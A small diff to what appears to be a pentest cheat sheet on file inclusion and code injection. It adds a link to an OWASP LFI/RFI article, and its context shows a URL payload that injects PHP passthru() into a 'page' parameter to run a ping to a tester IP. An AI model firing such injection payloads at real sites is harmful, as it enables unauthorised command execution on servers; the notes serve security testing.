@@ -34,3 +34,7 @@ Sometimes, some this work :
 ```
 /index.php?page=about'.passthru('ping%20-c%203%20192.168.49.160').'
 ```
+
+
+https://blog.clever-age.com/fr/2014/10/21/owasp-local-remote-file-inclusion-lfi-rfi/
+
